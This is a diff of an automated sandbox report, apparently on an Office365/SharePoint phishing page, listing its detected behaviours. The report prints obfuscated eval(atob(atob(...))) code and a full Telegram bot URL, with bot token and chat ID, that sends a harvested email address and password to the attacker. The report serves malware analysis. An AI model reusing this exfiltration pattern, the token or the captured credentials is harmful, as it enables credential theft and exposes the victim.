@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 1093,
+    "score": 1193,
     "sections": [
       {
         "auto_collapse": false,
@@ -16,7 +16,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript writes data to the console\n\t\tconsole.log(DRawson@suplitho.com)\n\n\t\tconsole.log(gdydb true)\n\n\t\tconsole.log(obago!)\n",
+        "body": "JavaScript appends a child object to the document and clicks it\n\t\tHTMLButtonElement[35].click(undefined)\n\n\t\tHTMLButtonElement[50].click(undefined)\n",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -26,36 +26,14 @@
           "heur_id": 3,
           "score": 10,
           "score_map": {
-            "console_output": 10
+            "append_and_click": 10
           },
           "signatures": {
-            "console_output": 1
+            "append_and_click": 1
           }
         },
         "tags": {},
-        "title_text": "Signature: ConsoleOutput",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript uses unescape() to decode an encoded string\n\t\tCalling unescape() no.: 1\n",
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "unescape": 10
-          },
-          "signatures": {
-            "unescape": 1
-          }
-        },
-        "tags": {},
-        "title_text": "Signature: Unescape",
+        "title_text": "Signature: AppendAndClick",
         "zeroize_on_tag_safe": false
       },
       {
@@ -82,7 +60,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript uses nested atob() calls for decoding\n\t\t  eval(atob(atob('WTI5dWMzUWdYekI0TXprM1pEQmhQVjh3ZURKa1lqSTdLR1oxYm1OMGFXOXVLRjh3ZURJNVlqVXhZU3hmTU...\n\t\teval(atob(atob('WTI5dWMzUWdYekI0TXprM1pEQmhQVjh3ZURKa1lqSTdLR1oxYm1OMGFXOXVLRjh3ZURJNVlqVXhZU3hmTUhn...",
+        "body": "JavaScript writes data to the console\n\t\tconsole.log(DRawson@suplitho.com)\n\n\t\tconsole.log(gdydb true)\n\n\t\tconsole.log(obago!)\n",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -90,16 +68,16 @@
           "attack_ids": [],
           "frequency": 1,
           "heur_id": 3,
-          "score": 500,
+          "score": 10,
           "score_map": {
-            "nested_atob": 500
+            "console_output": 10
           },
           "signatures": {
-            "nested_atob": 1
+            "console_output": 1
           }
         },
         "tags": {},
-        "title_text": "Signature: NestedAtoB",
+        "title_text": "Signature: ConsoleOutput",
         "zeroize_on_tag_safe": false
       },
       {
@@ -126,6 +104,28 @@
       },
       {
         "auto_collapse": false,
+        "body": "JavaScript uses nested atob() calls for decoding\n\t\t  eval(atob(atob('WTI5dWMzUWdYekI0TXprM1pEQmhQVjh3ZURKa1lqSTdLR1oxYm1OMGFXOXVLRjh3ZURJNVlqVXhZU3hmTU...\n\t\teval(atob(atob('WTI5dWMzUWdYekI0TXprM1pEQmhQVjh3ZURKa1lqSTdLR1oxYm1OMGFXOXVLRjh3ZURJNVlqVXhZU3hmTUhn...",
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {
+            "nested_atob": 500
+          },
+          "signatures": {
+            "nested_atob": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: NestedAtoB",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
         "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[75].send()\n\n\t\tXMLHttpRequest[77].send()\n",
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -148,7 +148,29 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript prepares a network request\n\t\t[2023-05-24T13:55:22.943Z] fetch(https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzc...\n\t\t[2023-05-24T13:55:22.944Z] XMLHttpRequest[77].open(get,https://api.telegram.org/bot6138224277:AAGTts...\n\t\t[2023-05-24T13:55:22.945Z] new URL(https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEg...",
+        "body": "JavaScript builds a webpage that is used for phishing\n\t\tThe following terms were found in the document: EMAIL,Email,PASSWORD,Password,Skype,account,email,pa...",
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 100,
+          "score_map": {
+            "phishing": 100
+          },
+          "signatures": {
+            "phishing": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Phishing",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript prepares a network request\n\t\t[2023-05-25T13:18:20.095Z] fetch(https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzc...\n\t\t[2023-05-25T13:18:20.095Z] XMLHttpRequest[77].open(get,https://api.telegram.org/bot6138224277:AAGTts...\n\t\t[2023-05-25T13:18:20.096Z] new URL(https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEg...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -166,28 +188,6 @@
         },
         "tags": {},
         "title_text": "Signature: PrepareNetworkRequest",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript appends a child object to the document and clicks it\n\t\tHTMLButtonElement[35].click(undefined)\n\n\t\tHTMLButtonElement[50].click(undefined)\n",
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "append_and_click": 10
-          },
-          "signatures": {
-            "append_and_click": 1
-          }
-        },
-        "tags": {},
-        "title_text": "Signature: AppendAndClick",
         "zeroize_on_tag_safe": false
       },
       {
@@ -232,6 +232,28 @@
         },
         "tags": {},
         "title_text": "Signature: SuspiciousProcess",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript uses unescape() to decode an encoded string\n\t\tCalling unescape() no.: 1\n",
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "unescape": 10
+          },
+          "signatures": {
+            "unescape": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Unescape",
         "zeroize_on_tag_safe": false
       },
       {
@@ -300,7 +322,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"url\": \"https://softwarereviews.s3.amazonaws.com/production/favicons/offerings/3117/original/Sharepoint_icon.png\", \"method\": \"get\"}, {\"url\": \"https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png\", \"method\": \"get\"}, {\"url\": \"https://logincdn.msauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg\", \"method\": \"get\"}, {\"url\": \"https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg\", \"method\": \"get\"}, {\"url\": \"https://ipinfo.io/json\", \"method\": \"get\"}, {\"url\": \"https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzcASMrb9g/sendMessage?chat_id=-943253829&text=<b>OFFICE365-HTML-LOGS@ZERO</b>%0A[1] 24/05/2023%0A<b>USER-AGENT: </b>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)%0A<a>seemee: @mrcew</a>%0A<b>EMAIL: </b><pre>DRawson@suplitho.com</pre>%0A<b>PASSWORD: </b><a>JsJ@w$==C00l!</a>%0A<b>Location: </b>IP: 127.0.0.1 | CITY: Ottawa ...\", \"method\": \"get\"}]",
+        "body": "[{\"url\": \"https://softwarereviews.s3.amazonaws.com/production/favicons/offerings/3117/original/Sharepoint_icon.png\", \"method\": \"get\"}, {\"url\": \"https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png\", \"method\": \"get\"}, {\"url\": \"https://logincdn.msauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg\", \"method\": \"get\"}, {\"url\": \"https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg\", \"method\": \"get\"}, {\"url\": \"https://ipinfo.io/json\", \"method\": \"get\"}, {\"url\": \"https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzcASMrb9g/sendMessage?chat_id=-943253829&text=<b>OFFICE365-HTML-LOGS@ZERO</b>%0A[1] 25/05/2023%0A<b>USER-AGENT: </b>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)%0A<a>seemee: @mrcew</a>%0A<b>EMAIL: </b><pre>DRawson@suplitho.com</pre>%0A<b>PASSWORD: </b><a>JsJ@w$==C00l!</a>%0A<b>Location: </b>IP: 127.0.0.1 | CITY: Ottawa ...\", \"method\": \"get\"}]",
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -316,7 +338,7 @@
           "file": {
             "string": {
               "extracted": [
-                "https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzcASMrb9g/sendMessage?chat_id=-943253829&text=<b>OFFICE365-HTML-LOGS@ZERO</b>%0A[1] 24/05/2023%0A<b>USER-AGENT: </b>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)%0A<a>seemee: @mrcew</a>%0A<b>EMAIL: </b><pre>DRawson@suplitho.com</pre>%0A<b>PASSWORD: </b><a>JsJ@w$==C00l!</a>%0A<b>Location: </b>IP: 127.0.0.1 | CITY: Ottawa ..."
+                "https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzcASMrb9g/sendMessage?chat_id=-943253829&text=<b>OFFICE365-HTML-LOGS@ZERO</b>%0A[1] 25/05/2023%0A<b>USER-AGENT: </b>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)%0A<a>seemee: @mrcew</a>%0A<b>EMAIL: </b><pre>DRawson@suplitho.com</pre>%0A<b>PASSWORD: </b><a>JsJ@w$==C00l!</a>%0A<b>Location: </b>IP: 127.0.0.1 | CITY: Ottawa ..."
               ]
             }
           },
@@ -416,14 +438,7 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "console_output"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "unescape"
+          "append_and_click"
         ]
       },
       {
@@ -437,7 +452,7 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "nested_atob"
+          "console_output"
         ]
       },
       {
@@ -451,6 +466,13 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
+          "nested_atob"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
           "network_request"
         ]
       },
@@ -458,14 +480,14 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "prepare_network_request"
+          "phishing"
         ]
       },
       {
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "append_and_click"
+          "prepare_network_request"
         ]
       },
       {
@@ -484,6 +506,13 @@
       },
       {
         "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "unescape"
+        ]
+      },
+      {
+        "attack_ids": [],
         "heur_id": 15,
         "signatures": []
       }
@@ -493,7 +522,7 @@
         {
           "heur_id": 1,
           "signatures": [],
-          "value": "https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzcASMrb9g/sendMessage?chat_id=-943253829&text=<b>OFFICE365-HTML-LOGS@ZERO</b>%0A[1] 24/05/2023%0A<b>USER-AGENT: </b>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)%0A<a>seemee: @mrcew</a>%0A<b>EMAIL: </b><pre>DRawson@suplitho.com</pre>%0A<b>PASSWORD: </b><a>JsJ@w$==C00l!</a>%0A<b>Location: </b>IP: 127.0.0.1 | CITY: Ottawa ..."
+          "value": "https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzcASMrb9g/sendMessage?chat_id=-943253829&text=<b>OFFICE365-HTML-LOGS@ZERO</b>%0A[1] 25/05/2023%0A<b>USER-AGENT: </b>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)%0A<a>seemee: @mrcew</a>%0A<b>EMAIL: </b><pre>DRawson@suplitho.com</pre>%0A<b>PASSWORD: </b><a>JsJ@w$==C00l!</a>%0A<b>Location: </b>IP: 127.0.0.1 | CITY: Ottawa ..."
         }
       ],
       "network.dynamic.domain": [
